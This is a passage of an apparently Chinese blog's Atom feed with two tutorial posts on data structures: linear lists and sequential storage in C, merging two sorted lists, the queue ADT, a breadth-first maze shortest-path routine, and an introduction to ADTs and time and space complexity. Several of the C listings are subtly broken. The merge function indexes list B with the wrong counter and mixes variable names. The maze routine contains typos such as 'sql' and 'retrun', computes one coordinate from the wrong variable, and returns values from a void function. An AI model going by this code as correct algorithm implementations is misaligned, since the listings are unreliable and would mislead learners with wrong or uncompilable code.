punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">//初始化</span><span class="token function">DestroyList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//删除</span><span class="token function">ListInsert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">,</span>i<span class="token punctuation">,</span>e<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//插入</span><span class="token function">ListDelete</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token operator">&amp;</span>e<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//删除指定元素</span><span class="token punctuation">}</span>ADT List</code></pre><p>线性表有两种存储结构：</p><p> &nbsp; &nbsp; &nbsp; ①定长的顺序存储结构——向量型的一维数组结构</p><p> &nbsp; &nbsp; &nbsp; ②变长的线性表存储结构——链接式存储结构，动态数组，顺序文件</p><h3 id="线性表的顺序存储以及运算实现"><a href="#线性表的顺序存储以及运算实现" class="headerlink" title="线性表的顺序存储以及运算实现"></a>线性表的顺序存储以及运算实现</h3><p> &nbsp; &nbsp; &nbsp; 众人皆知的数组，其实就是以顺序结构存储数据的线性表。</p><blockquote><p> 顺序表示例图：</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/09/5bbbfe6d21e6a.png" alt=""><br><br></div><blockquote><p>顺序表结构算法：</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> MAXSIZE 20           </span><span class="token comment" spellcheck="true">// 顺序表的最大存储容量</span><span class="token keyword">typedef</span> <span class="token keyword">int</span> datatype<span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// 顺序表存储的数据类型</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    datatype data<span class="token punctuation">[</span>MAXSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//线性表存储数据</span>    <span class="token keyword">int</span> Last<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//线性表的长度</span><span class="token punctuation">}</span>SeqList<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//定义一个顺序表 SeqList L;</span><span class="token comment" spellcheck="true">//定义一个SeqList类型的指针 SeqList *L;</span>SeqList <span class="token operator">*</span> <span class="token function">init_SeqList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//初始化线性表</span>    SeqList <span class="token operator">*</span>L<span class="token punctuation">;</span>    L <span class="token operator">=</span> <span class="token punctuation">(</span>SeqList <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>SeqList<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    L<span class="token operator">-></span>Last<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> L<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    SeqList <span class="token operator">*</span>L <span class="token operator">=</span> <span class="token function">init_SeqList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        L<span class="token operator">-></span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>        L<span class="token operator">-></span>Last <span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"当前顺序表的长度为 %d，顺序表的大小为 %d"</span><span class="token punctuation">,</span>L<span class="token operator">-></span>Last<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>L<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p> &nbsp; &nbsp; &nbsp; 顺序表应用举例：有顺序表A，B，其元素均按从小到大的升序排列，编写一个算法将他们合并成一个顺序表C，要求C的元素也是从小到大的升序排列。</p><p> &nbsp; &nbsp; &nbsp; 算法思路：依次扫描A和B中的元素，比较当前元素的值，将较小值的元素赋给C，直到一个线性表扫描完毕之后将未完的那个顺序表中余下的那部分赋给C，且C的容量需要能够容纳A,B两个线性表相加的长度，<strong>算法如下</strong>：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span>SeqList A<span class="token punctuation">,</span>SeqList B<span class="token punctuation">,</span>SeqList <span class="token operator">*</span>c<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">;</span>    i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>A<span class="token punctuation">.</span>last<span class="token operator">&amp;&amp;</span>j<span class="token operator">&lt;=</span>B<span class="token punctuation">.</span>last<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>A<span class="token punctuation">.</span>last<span class="token punctuation">)</span>        C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>B<span class="token punctuation">.</span>last<span class="token punctuation">)</span>        C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    C<span class="token operator">-></span>last<span class="token operator">=</span>k<span class="token number">-1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>顺序表的优缺点：</p><p>线性表的顺序存储结构，在存、读取数据时，不管是在哪个位置，时间复杂度都是O(1)。而在插入或者删除时，时间复杂度都是O(n)。</p><p>这也就是线性表的顺序存储结构比较适合存取数据，不适合经常插入和删除数据的应用。</p><p>优点：</p><p>1.无需为了表示表中元素之间的逻辑关系而增加额外的存储空间（相对于链式存储而言）。</p><p>2.可以快速的存取表中任意位置的元素。</p><p>缺点：</p><p>1.插入和删除操作需要移动大量的元素。</p><p>2.当线性表长度变化较大时，难以确定存储空间的容量。</p><p>3.容易造成存储空间的“碎片”(因为线性表的顺序存储结构申请的内存空间都以连续的，如果因为某些操作（比如删除操作）导致某个部分出现了一小块的不连续内存空间，因为这一小块内存空间太小不能够再次被利用/分配，那么就造成了内存浪费，也就是“碎片”)</p><p>参考 <a href="https://www.cnblogs.com/wsnb/p/5191518.html" target="_blank" rel="noopener">https://www.cnblogs.com/wsnb/p/5191518.html</a></p></blockquote><h3 id="线性表的链式存储和运算实现"><a href="#线性表的链式存储和运算实现" class="headerlink" title="线性表的链式存储和运算实现"></a>线性表的链式存储和运算实现</h3><p> &nbsp; &nbsp; &nbsp; 顺序表最大的缺点是移动数据元素需要耗费许多时间，影响操作效率。正是因为顺序表的特性，相邻两元素之间的数据存在相邻的关系，使得插入删除的操作麻烦了许多。</p><p> &nbsp; &nbsp; &nbsp; 而链式存储方法不需要用地址连续的存储单元来实现，从而可以使得逻辑相邻的两数据元素在物理上不相邻，但有优点就有缺点，链式存储方法不能进行随机存取。</p><p> &nbsp; &nbsp; &nbsp; 而链表又有单链表，循环链表，双向链表，静态链表的区别。</p><h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><blockquote><p>队列是一种操作受限的线性数据结构，与栈后进先出(LIFO)的数据结构截然不同的是队列是一种“先进先出”（FIFO）的数据结构。将这种插入在表一端进行，而删除在表另一端进行的数据结构称为队列（Queue)，并允许插入的一端为队尾（Rear），允许删除的一端为队首（Front）。</p><p><img src="https://i.loli.net/2018/10/16/5bc53818b751c.png" alt=""></p><p>队列的抽象数据类型如下：</p><pre><code>ADT Queue{数据对象：D={ai|ai∈ElemSet, i=1,2, …,n, n≥0}数据关系：R1={&lt;ai-1,ai&gt;|ai-1,ai∈D, i=1,2, …,n }            约定a1为队列头，an为队列尾。基本操作：    InitQueue( &amp;Q ):      操作结果：构造一个空队列Q。    DestroyQueue ( &amp;Q ):      初始条件：队列Q已存在。      操作结果：销毁队列Q。    ClearQueue ( &amp;Q ):      初始条件：队列Q已存在。      操作结果：将Q清为空队列。    QueueEmpty( Q ):      初始条件：队列Q已存在。      操作结果：若Q为空队列，则返回TRUE，否则返回FALSE。    QueueLength( Q ):      初始条件：队列Q已存在。      操作结果：返回Q的数据元素个数，即队列的长度。    GetHead( Q, &amp;e ):      初始条件：队列Q已存在且非空。      操作结果：用e返回Q的队头元素。    EnQueue( &amp;Q, e ):      初始条件：队列Q已存在。      操作结果：插入元素e为Q的新的队尾元素。    DeQueue( &amp;Q, &amp;e ):      初始条件：队列Q已存在且非空。      操作结果：删除Q的队头元素，并用e返回其值。}ADT Queue</code></pre></blockquote><h3 id="基于队列的算法设计实例"><a href="#基于队列的算法设计实例" class="headerlink" title="基于队列的算法设计实例"></a>基于队列的算法设计实例</h3><blockquote><p>​    求迷宫的最短路径：现要求设计一个算法找一条从迷宫入口到出口的最短路径。</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//队的定义</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//记录坐标</span>    <span class="token keyword">int</span> pre<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//pre作为前驱点在sq中的坐标</span><span class="token punctuation">}</span>sqtype<span class="token punctuation">;</span>sqtype sq<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> front<span class="token punctuation">,</span>rear<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//定义头尾</span><span class="token comment" spellcheck="true">//算法如下：</span><span class="token keyword">void</span> <span class="token function">path</span><span class="token punctuation">(</span>maze<span class="token punctuation">,</span>move<span class="token punctuation">)</span>    <span class="token keyword">int</span> maze<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//迷宫数组</span>    item move<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//坐标增量数组</span><span class="token punctuation">{</span>    sqtype sq<span class="token punctuation">[</span>NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> front<span class="token punctuation">,</span>rear<span class="token punctuation">;</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>v<span class="token punctuation">;</span>    front <span class="token operator">=</span> rear <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    sq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> sq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>y <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>sql<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    maze<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>front<span class="token operator">&lt;=</span>rear<span class="token punctuation">)</span><span class="token punctuation">{</span>        x <span class="token operator">=</span> sq<span class="token punctuation">[</span>front<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span>y<span class="token operator">=</span>sq<span class="token punctuation">[</span>front<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>v<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>v<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>v<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//探测八个方向的路径</span>            i <span class="token operator">=</span> x<span class="token operator">+</span>move<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span> j<span class="token operator">=</span>x<span class="token operator">+</span>move<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                rear<span class="token operator">++</span><span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span> i<span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token operator">=</span>j<span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token operator">=</span>front<span class="token punctuation">;</span>                maze<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//走过的路置-1</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>m<span class="token operator">&amp;&amp;</span>j<span class="token operator">==</span>m<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">printpath</span><span class="token punctuation">(</span>sq<span class="token punctuation">,</span>rear<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//打印迷宫</span>                  <span class="token function">restore</span><span class="token punctuation">(</span>maze<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//恢复迷宫，此处未写该函数</span>                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        front<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    retrun <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//打印迷宫的函数</span><span class="token keyword">void</span> <span class="token function">printpath</span><span class="token punctuation">(</span>sqtype sq<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> rear<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    i <span class="token operator">=</span> rear<span class="token punctuation">;</span>    <span class="token keyword">do</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"(%d,%d)&lt;--"</span><span class="token punctuation">,</span>sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">,</span>sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        i <span class="token operator">=</span> sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="https://i.loli.net/2018/10/16/5bc543e6329ce.png" alt=""></p><p>​    循环队列是队列的一种，就像一个首尾相连的贪吃蛇，一直转圈，超过一定长度，就会吃到自己的尾巴。    </p><p>​    如果有需要使用存储信息的队列，不建议使用循环队列，因为循环队列一旦超出定义的大小，就会对之前存储的信息发生覆盖（发生假溢出）。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;数据结构和算法-（Algorithm）-线性结构&quot;&gt;&lt;a href=&quot;#数据结构和算法-（Algorithm）-线性结构&quot; class=&quot;headerlink&quot; title=&quot;数据结构和算法 （Algorithm）- 线性结构&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
      <category term="算法" scheme="http://www.yof3ng.xyz/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://www.yof3ng.xyz/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="algorithm" scheme="http://www.yof3ng.xyz/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>数据结构和算法-day1</title>
    <link href="http://www.yof3ng.xyz/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day1/"/>
    <id>http://www.yof3ng.xyz/2018/10/07/数据结构和算法-day1/</id>
    <published>2018-10-07T02:48:38.000Z</published>
    <updated>2018-10-07T10:31:32.452Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="数据结构和算法-（Algorithm）-绪论"><a href="#数据结构和算法-（Algorithm）-绪论" class="headerlink" title="数据结构和算法 （Algorithm）- 绪论"></a>数据结构和算法 （Algorithm）- 绪论</h1><h2 id="数据是个啥？"><a href="#数据是个啥？" class="headerlink" title="数据是个啥？"></a>数据是个啥？</h2><p> &nbsp; &nbsp; &nbsp; 数据（data）是信息的载体，是对客观事物的符号化表示，它的含义极为广泛，包含了人们日穿生活中的各种信息在计算机内的表示，而<strong>数据元素</strong>则是数据的基本单位。</p><p><img src="http://photo.orsoon.com/JPG-180515/180515_42/k5oFKYNsQz_small.jpg" alt=""></p><h2 id="数据结构定义"><a href="#数据结构定义" class="headerlink" title="数据结构定义"></a>数据结构定义</h2><p>&nbsp; &nbsp; &nbsp; &nbsp; 数据结构分为逻辑结构和物理结构，以及数据运算三方面内容，一起来愉快地学习它吧😭！</p><h3 id="逻辑结构中几种结构的基本定义"><a href="#逻辑结构中几种结构的基本定义" class="headerlink" title="逻辑结构中几种结构的基本定义"></a>逻辑结构中几种结构的基本定义</h3><p>① 线性结构(1:1)：结构中的数据元素之间存在着一对一的关系，如表，栈，队列等。</p><p>② 树形结构(1:n)：结构中的数据元素之间存在着一对多的关系。</p><p>③ 图形结构(m:n)：结构中的数据元素之间存在着多对多的关系，图形结构也被称为网状结构。</p><p>④ 集合结构：集合结构中的数据元素之间的关系仅仅是”属于同一个集合”，这种结构中的元素关系极为松散，该结构较为少见。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 总体来说，根据数据元素之间存在的不同关系，数据结构可分为<strong>线性结构和非线性结构😱</strong>。</p><p><img src="https://i.loli.net/2018/10/07/5bb97795e5dd5.png" alt=""></p><h3 id="数据结构中的物理结构"><a href="#数据结构中的物理结构" class="headerlink" title="数据结构中的物理结构"></a>数据结构中的物理结构</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 数据的逻辑结构和数据的存储无关，对数据的操作主要依赖数据的存储，而数据在计算机中的存储表示即数据的存储结构可分为<strong>顺序存储</strong>和<strong>非顺序存储</strong>，但针对一些特殊应用，还有<strong>索引存储结构，散列存储（hash方法）结构</strong>等其他表示方法。</p><p>① <strong>顺序存储方法</strong>：把逻辑上相邻的数据元素储存在物理位置上也相邻的存储单元中，例如数组即是顺序存储方法。</p><p>② <strong>链式存储方法</strong>：逻辑上相邻的数组元素不要求其在物理位置上也相邻，通过附设的指针字段值来指示数据的逻辑关系，算法中的指针就是由链式存储结构实现的。</p><p>③ 索引存储方法：除建立存储结点信息外，还建立附加的索引表来标识结点的地址，索引表由若干索引项组成。 <strong>Dense Index（稠密索引）</strong>代表每个数据元素在索引表中均有一个索引项。<strong>Sparse Index（稀疏索引）</strong>，代表一个索引项对应一组数据元素，<a href="https://www.cnblogs.com/FreeFire/p/4329528.html" target="_blank" rel="noopener">参考链接</a>。</p><p>④ 散列存储方法（Hash方法）：散列是数组存储方式的一种发展，相比数组，散列的数据访问速度要高于数组，因为可以依据存储数据的部分内容找到数据在数组中的存储位置，进而能够快速实现数据的访问，理想的散列访问速度是非常迅速的，而不像在数组中的遍历过程，采用存储数组中内容的部分元素作为映射函数的输入，映射函数的输出就是存储数据的位置，这样的访问速度就省去了遍历数组的实现，因此<strong>时间复杂度可以认为为O(1)</strong>，而<strong>数组遍历的时间复杂度为O(n)</strong>，<a href="https://baike.baidu.com/item/%E6%95%A3%E5%88%97%E5%AD%98%E5%82%A8%E6%96%B9%E6%B3%95/9663463?fr=aladdin" target="_blank" rel="noopener">参考链接</a>。</p><h2 id="抽象数据类型（Abstract-Data-Type，ADT）"><a href="#抽象数据类型（Abstract-Data-Type，ADT）" class="headerlink" title="抽象数据类型（Abstract Data Type，ADT）"></a>抽象数据类型（Abstract Data Type，ADT）</h2><p> &nbsp; &nbsp; &nbsp; ADT 的定义：一个数学模型以及定义在该模型上的一组操作。描述数据结构的一种理论工具。</p><pre class=" language-bash"><code class="language-bash">ADT 抽象数据类型名称 <span class="token punctuation">{</span>数据对象：<span class="token operator">&lt;</span>数据对象定义<span class="token operator">></span>……数据关系：<span class="token operator">&lt;</span>逻辑关系定义<span class="token operator">></span>……操作集合：  操作名1：  <span class="token operator">&lt;</span>基本操作1初始条件描述<span class="token operator">></span>  <span class="token operator">&lt;</span>基本操作1操作结果描述<span class="token operator">></span>  ……  ……  操作名n：  <span class="token operator">&lt;</span>基本操作n初始条件描述<span class="token operator">></span>  <span class="token operator">&lt;</span>基本操作n操作结果描述<span class="token operator">></span><span class="token punctuation">}</span>ADT抽象数据类型名称</code></pre><p> &nbsp; &nbsp; &nbsp; ADT 的作用：抽象数据类型可以使我们更容易描述现实世界。例：用线性表描述学生成绩表，用树或图描述遗传关系。<strong>优点是拥有较强的重复性，灵活性，封装性。</strong></p><p> &nbsp; &nbsp; &nbsp; ADT 的关键特征：使用它的人可以只关心它的逻辑特征，不需要了解它的存储方式。定义它的人同样不必要关心它如何存储。</p><p> &nbsp; &nbsp; &nbsp; 例如：线性表这样的抽象数据类型，其数学模型是：<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%85%83%E7%B4%A0" target="_blank" rel="noopener">数据元素</a>的集合，该集合内的元素有这样的关系：除第一个和最后一个外，每个元素有唯一的前趋和唯一的后继。可以有这样一些操作：插入一个元素、删除一个元素等。</p><p> &nbsp; &nbsp; &nbsp; <strong>从抽象数据类型的角度看，数据结构是ADT的物理实现。</strong></p><h2 id="算法的复杂度"><a href="#算法的复杂度" class="headerlink" title="算法的复杂度"></a>算法的复杂度</h2><p> &nbsp; &nbsp; &nbsp; 算法的复杂度通常分为时间复杂度，空间复杂度，采用<strong>“大O表示法”</strong>定义算法效率度量。</p><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p> &nbsp; &nbsp; &nbsp; 判定算法性能的一个基本考虑是处理一定<strong>“规模（Size）”</strong>的输入时，该算法所需执行的<strong>“基本操作数（Basic Operation）”。</strong></p><p> &nbsp; &nbsp; &nbsp; T(N) = O(f(N))是指保证函数T(N)以不快于f(N)速度增长；f(N)是一个上界（upper bound），即某个算法的增长率最差情况是f(N)，给出几个例子：</p><pre class=" language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span> <span class="token punctuation">{</span> <span class="token operator">++</span>x<span class="token punctuation">;</span>s<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//1.算法时间复杂度为 O(1),称为常量阶</span><span class="token number">2</span><span class="token punctuation">.</span> <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token operator">++</span>x<span class="token punctuation">;</span>s<span class="token operator">+</span><span class="token operator">=</span>x<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//2.算法时间复杂度为 O(n),称为线性阶</span><span class="token number">3</span><span class="token punctuation">.</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span>i<span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token operator">++</span>x<span class="token punctuation">;</span>        s<span class="token operator">+</span><span class="token operator">=</span>x<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//3.算法时间复杂度为 O(n*n),称为平方阶</span><span class="token number">4</span><span class="token punctuation">.</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">)</span><span class="token punctuation">{</span> i<span class="token operator">=</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//4.算法时间复杂度为 O(log2n),称为对数阶</span><span class="token comment" spellcheck="true">//根据基本执行次数，运用极限的方法来计算复杂度</span></code></pre><h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h3><p> &nbsp; &nbsp; &nbsp; 一个程序的空间复杂度是指从程序运行到结束所需的存储量。而程序的存储空间分为固定部分和可变部分，就像电脑分了硬盘存储空间和内存存储空间一样😄，程序本身所占的物理空间加上程序运行时所需要的内存组成了程序运行所需的存储空间。</p><p>Try to get the best answer！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;数据结构和算法-（Algorithm）-绪论&quot;&gt;&lt;a href=&quot;#数据结构和算法-（Algorithm）-绪论&quot; class=&quot;headerlink&quot; title=&quot;数据结构和算法 （Algorithm）- 绪论&quot;&gt;&lt;/a&gt;数据结构和算
      
    
    </summary>
    
      <category term="算法" scheme="http://www.yof3ng.xyz/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://www.yof3ng.xyz/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
</feed>
